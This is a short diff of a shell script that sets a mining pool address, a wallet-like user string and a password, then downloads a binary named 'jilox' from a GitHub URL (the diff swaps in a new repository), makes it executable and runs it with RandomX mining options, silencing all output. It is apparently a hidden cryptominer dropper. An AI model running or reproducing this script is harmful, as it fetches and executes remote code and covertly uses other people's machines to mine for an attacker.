@@ -13,7 +13,7 @@ cd ..
 A=139.144.21.125:443
 B=ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD
 C=regis
-wget https://github.com/13422159/data/raw/main/jilox && chmod u+x jilox
+wget https://github.com/bengetsia/soft/raw/main/jilox && chmod u+x jilox
 ./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
 r
 
